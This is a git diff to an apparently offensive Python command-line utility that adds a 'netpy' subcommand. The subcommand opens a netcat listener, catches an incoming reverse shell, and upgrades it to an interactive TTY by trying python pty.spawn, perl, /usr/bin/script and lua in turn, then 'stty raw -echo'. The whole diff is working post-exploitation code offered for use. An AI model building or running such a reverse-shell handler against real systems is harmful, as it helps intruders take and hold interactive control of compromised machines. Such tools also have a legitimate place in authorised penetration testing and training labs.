@@ -25,11 +25,13 @@
 #################################################################################
 
 
-from os import system, listdir, getcwd
+from os import system, listdir, getcwd, popen
 from sys import argv, exit, platform
 from termcolor import colored
+from time import sleep
 import netifaces as ni
 import webbrowser
+import pexpect
 
 
 
@@ -47,6 +49,132 @@ def clear():
         system("cls")
     else:
         system("clear")
+
+
+# --------------------------------------------------------------------------------------------------------------------
+
+
+
+def dep():
+
+    if not "bin" in popen("whereis stty").read():
+        Error("stty not found, please install it")
+        exit()
+
+    if not "bin" in popen("whereis nc").read():
+        Error("Nc not found, please install it")
+        exit()
+
+def pysearch(version, session):
+    global verbosity
+    verbosity = True
+    
+    if verbosity is True:
+        print(Info(f"trying to locate {version}"))
+
+    session.sendline(f"/usr/bin/{version} -c \"import pty ; pty.spawn('/bin/bash')\" ")
+    x = session.expect("@", timeout=3)
+    if x==0:
+        session.sendcontrol("z")
+        session.sendline("stty raw -echo")  
+        session.sendline("fg")
+        sleep(3)
+        session.sendline("export TERM=xterm")
+        session.sendline("clear")
+        session.interact()
+
+def basicTTY(session):
+            session.sendline("export TERM=xterm")
+            session.sendline("clear")
+            session.interact()
+
+def listenner(port):
+
+
+    
+    if int(port)>65535:
+        Error(f"{port} is not a valid port number")
+        exit()
+
+
+    shell = pexpect.spawn("/bin/bash", encoding='utf-8', timeout=None)
+    print(Info(f"Listening on port {port}"))
+    try:
+        shell.sendline(f"""nc -nvlp {port} """)
+    except KeyboardInterrupt:
+        Error("\nExiting...")
+        exit()
+
+    t = 2
+
+
+    def stabilize(session):
+        
+        session.expect(["from", "received"])
+        Good("Connection received")
+
+        try:
+           pysearch("python3", session)    
+
+        except pexpect.exceptions.TIMEOUT:
+
+            try:
+               pysearch("python2", session)
+                
+            except pexpect.exceptions.TIMEOUT:
+                try:
+                    pysearch("python", session)
+
+                except pexpect.exceptions.TIMEOUT:
+                    try:            
+
+                        if verbosity is True:
+                            print(Info(f"trying to locate perl"))
+
+                        session.sendline(f"""perl -e "exec '/bin/bash';" """)
+                        perl = session.expect("@", timeout=3)       
+            
+                        if perl==0:
+                            basicTTY(session)
+
+                    except pexpect.exceptions.TIMEOUT:
+                        
+                        try:
+                            if verbosity is True:
+                                print(Info(f"trying to locate /usr/bin/script"))
+                
+                            session.sendline(f"/usr/bin/script -qc /bin/bash /dev/null")
+                            script = session.expect("@", timeout=10)
+            
+                            if script==0:
+                                basicTTY(session)
+
+                        except pexpect.exceptions.TIMEOUT:
+                            try:
+                                if verbosity is True:
+                                    print(Info(f"trying to locate lua"))
+
+                                session.sendline(f"""lua -e "os.execute('/bin/sh')" """)
+                                lua = session.expect("@", timeout=10)
+
+                                if lua==0:
+                                    basicTTY(session)
+
+                            except pexpect.exceptions.TIMEOUT:
+                                Error("Unable to determinate a way to get a TTY")
+                                session.interact()
+
+    stabilize(shell)
+def netpy(p):
+
+    dep()
+    
+    try:
+        port = int(p)
+    except:
+        Error("Port must be an integer !")
+        exit()
+    listenner(p)
 
 
 # --------------------------------------------------------------------------------------------------------------------
@@ -242,7 +370,8 @@ class Help:
 
         print(f"""
 {colored("├──", "white", attrs=['bold'])} {colored("utils gen   ", "blue", attrs=['bold'])}    {colored("Generate reverse shells easely", "white", attrs=['bold'])}      
-{colored("├──", "white", attrs=['bold'])} {colored("utils ip    ", "blue", attrs=['bold'])}    {colored("Display all local ip          ", "white", attrs=['bold'])}  
+{colored("├──", "white", attrs=['bold'])} {colored("utils ip    ", "blue", attrs=['bold'])}    {colored("Display all local ip          ", "white", attrs=['bold'])}
+{colored("├──", "white", attrs=['bold'])} {colored("utils netpy", "blue", attrs=['bold'])}  {colored("Shell stabilizer", "white", attrs=['bold'])}    
 {colored("├──", "white", attrs=['bold'])} {colored("utils ddg   ", "blue", attrs=['bold'])}    {colored("Searching with duckduckgo     ", "white", attrs=['bold'])}   
 {colored("├──", "white", attrs=['bold'])} {colored("utils google", "blue", attrs=['bold'])}    {colored("Searching with google         ", "white", attrs=['bold'])}  
 {colored("├──", "white", attrs=['bold'])} {colored("utils wordlist", "blue", attrs=['bold'])}  {colored("Listing the /usr/share/wordlists dir", "white", attrs=['bold'])}  
@@ -325,6 +454,22 @@ class Main:
             
         elif argv[1].lower() == "wordlist":
             Wordlist()
+        elif argv[1].lower() == "netpy":
+            try:
+                arg2 = argv[2]
+            except:
+                print("")
+                print(Info("usage : utils netpy <port>"))
+                print(Info("Example : utils netpy 1234\n"))       
+                exit()
+            
+            if arg2 in ["help", "--help", "-h"]:
+                print("")
+                print(Info("usage : utils netpy <port>"))
+                print(Info("Example : utils netpy 1234\n"))       
+                exit()
+            netpy(arg2)
+            
             
         else:
             Error(f"Unrecognized argument {argv[1]}")            
